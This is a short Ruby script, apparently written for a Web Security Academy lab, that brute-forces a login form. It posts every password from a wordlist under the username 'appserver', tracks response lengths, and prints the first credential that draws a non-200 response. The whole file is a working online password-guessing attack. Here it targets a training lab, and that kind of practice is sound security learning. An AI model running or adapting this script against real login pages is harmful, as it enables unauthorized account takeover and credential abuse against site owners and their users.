# frozen_string_literal: true

require 'uri'
require 'net/http'

TARGET = 'https://0ae100b3035f30f5c2f536c7004100da.web-security-academy.net/login'

uri = URI(TARGET)

PASSWORDS = 'password_list.txt'
CANDIDATE = 'appserver'

memo = {}
KEY = 'content-length'

File.readlines(PASSWORDS).each do |line|
  l = line.strip
  puts "Trying #{CANDIDATE}:#{l}"
  res = Net::HTTP.post_form(uri, username: CANDIDATE, password: l)
  tracker = memo.fetch(res[KEY], [])
  tracker << l
  memo[res[KEY]] = tracker
  next if res.code == '200'

  puts "#{CANDIDATE}:#{l}"
  break
end

# Uncomment if no password found, usefule for debuggin
# puts "Inspector hashmap of {#{KEY} => 'password'}"
# puts memo
